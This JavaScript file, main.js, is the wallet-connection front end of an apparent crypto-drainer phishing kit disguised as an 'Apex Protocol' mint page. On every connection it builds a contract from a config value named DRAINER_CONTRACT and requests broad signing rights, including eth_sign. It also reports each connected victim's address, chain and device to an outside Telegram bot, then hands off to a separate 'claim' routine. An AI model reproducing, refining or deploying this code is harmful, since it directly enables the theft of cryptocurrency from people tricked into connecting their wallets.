// main.js — Wallet connection orchestrator for Apex Protocol
// Matches config.js + script.js contracts.
// Author: senior integration pass — clean, deterministic, mobile-safe.

import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONFIG EXTRACTION (with safe fallbacks)
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    MAINNET_ID = 1,
  } = CONFIG || {};

  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID || PROJECT_ID;

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  const WC_CHAINS = [MAINNET_ID];
  const WC_METHODS = [
    'eth_sendTransaction',
    'personal_sign',
    'eth_sign',
    'eth_signTypedData',
    'eth_signTypedData_v4',
  ];
  const WC_EVENTS = ['chainChanged', 'accountsChanged'];

  // ==========================================================================
  //  PLATFORM
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  const getPlatform = () => {
    if (isIOSDevice) return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA)) return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  };

  // ==========================================================================
  //  DEBUG PANEL (double-tap to toggle)
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 6px;
    z-index: 100000; max-height: 160px; overflow-y: auto;
    display: none; font-family: ui-monospace, Menlo, monospace;
    border-top: 1px solid #222;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.insertAdjacentHTML('beforeend', `<div>${ts}: ${msg}</div>`);
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;

    // MetaMask mobile
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) {
      return { wallet: 'metamask', name: 'MetaMask' };
    }
    // Trust
    if (eth.isTrust || /TrustWallet/i.test(UA)) {
      return { wallet: 'trust', name: 'Trust Wallet' };
    }
    // Coinbase
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) {
      return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    }
    // Rainbow
    if (/Rainbow/i.test(UA)) {
      return { wallet: 'rainbow', name: 'Rainbow' };
    }
    // Rabby mobile
    if (eth.isRabby && isMobileDevice) {
      return { wallet: 'rabby', name: 'Rabby' };
    }
    return null;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG || {};

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      });
      if (!r.ok) {
        console.error('[main.js] Telegram error:', await r.text());
        return false;
      }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || `🧪 Test ${new Date().toISOString()}`);

  // ==========================================================================
  //  LIBRARY LOADING (CDN fallback chain + timeout)
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    let t;
    return Promise.race([
      promise.finally(() => clearTimeout(t)),
      new Promise((_, reject) => {
        t = setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms);
      }),
    ]);
  }

  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(/* @vite-ignore */ url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} loaded in ${(performance.now() - t0).toFixed(0)}ms`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadWalletConnectLibraries() {
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const modalCdn = [
      'https://esm.sh/@walletconnect/modal@2.6.2?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
    ];
    const web3Cdn = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
      'https://cdn.skypack.dev/web3@4.3.0',
    ];

    const [EthereumProvider, WalletConnectModal, Web3Mod] = await Promise.all([
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default || m,     'EthereumProvider'),
      tryImport(modalCdn,    (m) => m.WalletConnectModal || m.default || m,   'WalletConnectModal'),
      tryImport(web3Cdn,     (m) => m.default || m.Web3 || m,                 'Web3'),
    ]);

    return {
      EthereumProvider,
      WalletConnectModal,
      Web3: Web3Mod.default || Web3Mod.Web3 || Web3Mod,
    };
  }

  // ==========================================================================
  //  RELAY REACHABILITY PROBE (best-effort hint)
  // ==========================================================================
  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      const ok = await new Promise((resolve) => {
        let done = false;
        const finish = (v) => { if (done) return; done = true; try { ws.close(); } catch {} resolve(v); };
        let ws;
        try { ws = new WebSocket(url); } catch { return resolve(false); }
        const timer = setTimeout(() => finish(false), timeoutMs);
        ws.onopen  = () => { clearTimeout(timer); finish(true); };
        ws.onerror = () => { clearTimeout(timer); finish(false); };
        ws.onclose = () => { clearTimeout(timer); finish(false); };
      });
      if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
    }
    logDebug('⚠️ No relay reachable — using SDK default');
    return null;
  }

  // ==========================================================================
  //  DOM
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  STATE — single source of truth
  // ==========================================================================
  let EthereumProvider   = null;   // class
  let WalletConnectModal = null;   // class
  let Web3Ctor           = null;   // class

  let wcProvider         = null;   // EthereumProvider instance (owned by us)
  let injectedProvider   = null;   // window.ethereum instance (desktop path)
  let activeProvider     = null;   // whichever is live right now
  let web3Instance       = null;
  let contractInstance   = null;
  let isConnecting       = false;
  let isDisconnecting    = false;
  let connectionMode     = null;   // 'walletconnect' | 'injected' | null

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.style.transition   = 'background 0.2s ease';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg,#666,#888)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 2500);
        break;
      default:
        button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  const LS = { addr: 'connectedWallet', mode: 'connectionMode' };
  const saveWallet       = (address, mode) => {
    try {
      localStorage.setItem(LS.addr, address);
      if (mode) localStorage.setItem(LS.mode, mode);
    } catch {}
  };
  const getSavedWallet   = () => { try { return localStorage.getItem(LS.addr); } catch { return null; } };
  const getSavedMode     = () => { try { return localStorage.getItem(LS.mode); } catch { return null; } };
  const clearSavedWallet = () => {
    try { localStorage.removeItem(LS.addr); localStorage.removeItem(LS.mode); } catch {}
  };

  // ==========================================================================
  //  GLOBAL PUBLISH (contract with script.js)
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      mode: connectionMode,
      publishedAt: Date.now(),
    };
    logDebug(`publishGlobal: addr=${address} mode=${connectionMode} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain, mode: connectionMode },
    }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: ui-monospace, monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg,#ECFDF5,#D1FAE5);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      (connectButton?.parentNode || document.body).appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 1500);
      }).catch(() => {});
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
🧩 <b>Mode:</b> ${connectionMode || 'unknown'}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    connectionMode = null;
    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 DISCOVERY
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!d?.info?.uuid) return;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963 announced: ${d.info.name}`);
      }
    });

    const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    request();
    setTimeout(request, 500);
    setTimeout(request, 1500);
  }

  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;';
    const modalEl = document.createElement('div');
    modalEl.style.cssText = 'background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,system-ui,sans-serif;';
    modalEl.innerHTML = `
      <h3 style="margin:0 0 16px;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:0 0 16px"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%;">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.style.cssText = 'background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:15px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;';
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.cssText = 'width:24px;height:24px;border-radius:4px;';
        b.appendChild(i);
      }
      const label = document.createElement('span');
      label.textContent = p.info.name || 'Wallet';
      b.appendChild(label);
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });

    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT INIT
  //  EthereumProvider.init() owns SignClient + session persistence.
  // ==========================================================================
  async function initWalletConnect({ useFallbackId = false } = {}) {
    if (wcProvider) return wcProvider;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) {
      logDebug('❌ No WalletConnect projectId configured');
      return null;
    }

    try {
      const relayUrl = await pickRelayUrl();
      logDebug(`WC init: projectId=${String(projectId).slice(0, 8)}… relay=${relayUrl || 'default'}`);

      const t0 = performance.now();
      const opts = {
        projectId,
        chains: WC_CHAINS,
        optionalChains: WC_CHAINS,
        showQrModal: false, // we render our own
        methods: WC_METHODS,
        events: WC_EVENTS,
        metadata: DAPP_METADATA,
        // rpcMap helps wallets talk to the chain
        rpcMap: { [MAINNET_ID]: 'https://cloudflare-eth.com' },
      };
      if (relayUrl) opts.relayUrl = relayUrl;

      wcProvider = await withTimeout(
        EthereumProvider.init(opts),
        15000,
        'EthereumProvider.init'
      );

      attachWCProviderEvents(wcProvider);
      logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
      return wcProvider;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      wcProvider = null;
      return null;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT EVENTS — attached once
  // ==========================================================================
  function attachWCProviderEvents(provider) {
    if (!provider || provider.__apexEventsAttached) return;
    provider.__apexEventsAttached = true;

    provider.on('accountsChanged', (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        hardDisconnect({ skipWalletCall: true });
        return;
      }
      const a = accounts[0];
      saveWallet(a, 'walletconnect');
      updateConnectedUI(a, 'evm');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 800);
    });

    provider.on('chainChanged', (id) => {
      logDebug(`WC chainChanged: ${id}`);
      showStatus(`Network changed to ${id}`, 'info');
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', (reason) => {
      logDebug(`WC disconnect: ${reason}`);
      hardDisconnect({ skipWalletCall: true });
    });

    provider.on('session_delete', () => {
      logDebug('WC session_delete');
      hardDisconnect({ skipWalletCall: true });
    });
  }

  // ==========================================================================
  //  INJECTED EVM CONNECT
  // ==========================================================================
  function attachInjectedEvents(provider) {
    if (!provider?.on || provider.__apexInjectedEvents) return;
    provider.__apexInjectedEvents = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        hardDisconnect({ skipWalletCall: true });
      } else {
        const a = accounts[0];
        saveWallet(a, 'injected');
        updateConnectedUI(a, 'evm');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 800);
      }
    });

    provider.on('chainChanged', () => {
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', () => {
      hardDisconnect({ skipWalletCall: true });
    });
  }

  async function connectInjected() {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 400));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected', uuid: 'injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return null;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info?.rdns === 'io.metamask' || /metamask/i.test(p.info?.name || '')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return null;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        20000,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return null;

      const address = accounts[0];
      injectedProvider = provider;
      activeProvider = provider;
      connectionMode = 'injected';

      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);

      saveWallet(address, 'injected');
      attachInjectedEvents(provider);
      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info?.name || 'wallet'})`);
      return address;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return null;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT CONNECT
  //  Flow: init → (session? sync) → display_uri → openModal → enable() → updateUI
  // ==========================================================================
  async function connectWalletConnect({ useFallbackId = false } = {}) {
    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    const provider = await initWalletConnect({ useFallbackId });
    if (!provider) return null;

    // If a persisted session already exists, mirror it and exit.
    if (provider.session && provider.accounts?.length) {
      const a = provider.accounts[0];
      activeProvider = provider;
      connectionMode = 'walletconnect';
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
      saveWallet(a, 'walletconnect');
      updateConnectedUI(a, 'evm');
      logDebug(`✅ WC session reused: ${a}`);
      return a;
    }

    // Render our own QR modal on desktop only. On mobile the wallet
    // app handles the deep link natively and no modal is needed.
    let modalController = null;
    if (WalletConnectModal && isDesktopDevice) {
      try {
        modalController = new WalletConnectModal({
          projectId,
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
          },
          enableExplorer: true,
          mobileWallets: [],
          desktopWallets: [],
        });
      } catch (e) {
        logDebug('Modal init: ' + e.message);
      }
    }

    let uriShown = false;
    const onUri = (uri) => {
      if (uriShown) return;
      uriShown = true;
      logDebug(`display_uri received (len=${uri?.length || 0})`);
      try {
        modalController?.openModal({ uri });
      } catch (e) {
        logDebug('openModal: ' + e.message);
      }
    };
    provider.on('display_uri', onUri);

    showStatus(isMobileDevice ? 'Opening wallet app…' : 'Scan the QR code to connect', 'info');

    try {
      // enable() triggers pairing AND waits for session approval.
      const accounts = await provider.enable();
      provider.removeListener?.('display_uri', onUri);
      try { modalController?.closeModal(); } catch {}

      if (!accounts?.length) {
        logDebug('WC enable returned no accounts');
        return null;
      }

      const address = accounts[0];
      activeProvider = provider;
      connectionMode = 'walletconnect';
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);

      saveWallet(address, 'walletconnect');
      updateConnectedUI(address, 'evm');
      logDebug(`✅ WC connected: ${address}`);
      return address;
    } catch (e) {
      provider.removeListener?.('display_uri', onUri);
      try { modalController?.closeModal(); } catch {}
      logDebug('WC enable error: ' + e.message);

      if (/rejected|user rejected|user closed|user cancel/i.test(e.message || '')) {
        logDebug('User rejected WC');
        return null;
      }
      // Throw upward so caller can fall back to a different project id.
      throw e;
    }
  }

  // ==========================================================================
  //  HARD DISCONNECT
  //  Kills both WalletConnect session and injected state.
  // ==========================================================================
  async function hardDisconnect({ skipWalletCall = false } = {}) {
    if (isDisconnecting) return;
    isDisconnecting = true;

    try {
      if (!skipWalletCall && connectionMode === 'walletconnect' && wcProvider?.session) {
        try {
          await Promise.race([
            wcProvider.disconnect(),
            new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
          ]);
        } catch (e) {
          logDebug('WC disconnect err: ' + e.message);
        }
      }

      if (connectionMode === 'injected' && injectedProvider?.request) {
        // Best-effort revoke (MetaMask supports wallet_revokePermissions).
        try {
          await injectedProvider.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          }).catch(() => {});
        } catch {}
      }
    } finally {
      wcProvider = null; // force re-init next time
      injectedProvider = null;
      activeProvider = null;
      web3Instance = null;
      contractInstance = null;
      connectionMode = null;
      resetConnectedUI();
      clearSavedWallet();
      isDisconnecting = false;
      logDebug('🔌 Disconnected');
    }
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;

    try {
      const inWallet = detectInWalletBrowser();

      // Prefer injected ONLY inside a wallet's dApp browser.
      if (inWallet && isMobileDevice) {
        logDebug(`📱 In-wallet browser detected: ${inWallet.name}`);
        address = await connectInjected();
      } else if (isDesktopDevice && window.ethereum) {
        // Desktop with an extension installed: try injected first.
        address = await connectInjected();
      }

      // Fall back to WalletConnect.
      if (!address) {
        try {
          address = await connectWalletConnect({ useFallbackId: false });
        } catch (e) {
          logDebug('Primary WC attempt failed: ' + e.message);
        }
      }

      // Retry with a fallback project id.
      if (!address && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
        logDebug('Retrying WC with fallback projectId…');
        try {
          address = await connectWalletConnect({ useFallbackId: true });
        } catch (e) {
          logDebug('Fallback WC attempt failed: ' + e.message);
        }
      }
    } catch (e) {
      logDebug('connectWallet exception: ' + e.message);
    } finally {
      isConnecting = false;
    }

    if (address) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('Connection failed or cancelled', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT DISPATCHER
  // ==========================================================================
  async function disconnectWallet() {
    showStatus('Disconnecting…', 'info');
    await hardDisconnect();
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    if (isConnecting || isDisconnecting) return;
    const isConnected = !!activeProvider || !!getSavedWallet();
    if (isConnected) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  //  EthereumProvider.init() rehydrates the session from its own storage.
  //  We simply mirror `.session` / `.accounts` into our UI + global state.
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedMode   = getSavedMode();
    if (!savedWallet) return;

    // --- WalletConnect restore ---
    if (savedMode === 'walletconnect' || !savedMode) {
      try {
        const provider = await initWalletConnect({ useFallbackId: false });
        if (provider?.session && provider.accounts?.length) {
          const a = provider.accounts[0];
          activeProvider = provider;
          connectionMode = 'walletconnect';
          web3Instance = new Web3Ctor(provider);
          contractInstance = new web3Instance.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
          saveWallet(a, 'walletconnect');
          updateConnectedUI(a, 'evm');
          logDebug(`♻️ WC session restored: ${a}`);
          return;
        }
      } catch (e) {
        logDebug('WC restore: ' + e.message);
      }
    }

    // --- Injected restore ---
    if (savedMode === 'injected' || !savedMode) {
      const prov = window.ethereum;
      if (prov?.request && isDesktopDevice) {
        try {
          const accounts = await prov.request({ method: 'eth_accounts' });
          if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            injectedProvider = prov;
            activeProvider = prov;
            connectionMode = 'injected';
            web3Instance = new Web3Ctor(prov);
            contractInstance = new web3Instance.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
            saveWallet(savedWallet, 'injected');
            attachInjectedEvents(prov);
            updateConnectedUI(savedWallet, 'evm');
            logDebug(`♻️ Injected session restored: ${savedWallet}`);
            return;
          }
        } catch (e) {
          logDebug('Injected restore: ' + e.message);
        }
      }
    }

    // Nothing restorable — clear stale keys.
    logDebug('⚠️ No restorable session — clearing saved wallet');
    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const [libs] = await Promise.all([
      loadWalletConnectLibraries(),
      pickRelayUrl().catch(() => null),
    ]);
    EthereumProvider   = libs.EthereumProvider;
    WalletConnectModal = libs.WalletConnectModal;
    Web3Ctor           = libs.Web3;
    logDebug('✅ All libraries loaded');

    if (!EthereumProvider || !WalletConnectModal || !Web3Ctor) {
      throw new Error('Library load incomplete');
    }

    setupEIP6963();

    // Pre-warm WC on mobile for a snappier first tap.
    if (isMobileDevice) {
      logDebug('📱 Pre-warming WalletConnect…');
      initWalletConnect({ useFallbackId: false }).catch(() => {});
    }

    // Give EIP-6963 a moment to announce providers, then try restore.
    await new Promise((r) => setTimeout(r, 300));
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // ==========================================================================
  //  CLEANUP
  // ==========================================================================
  window.addEventListener('beforeunload', () => {
    try { debugArea?.remove(); } catch {}
  });

  logDebug(`✅ main.js ready — platform=${getPlatform()} mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
